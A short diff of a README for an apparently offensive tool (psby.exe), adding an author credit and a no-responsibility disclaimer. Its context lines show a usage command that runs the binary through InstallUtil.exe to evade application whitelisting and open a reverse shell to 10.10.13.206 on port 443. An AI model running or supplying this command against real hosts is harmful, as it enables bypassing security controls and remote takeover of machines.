@@ -28,3 +28,8 @@ Once you've compiled the binary, issue the below command on the target host.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+
+
+## Author
+This code is developed by Chris D. (@padovah4ck)[twitter](https://twitter.com/padovah4ck)  
+Use it at your own risk. No responsability on my side
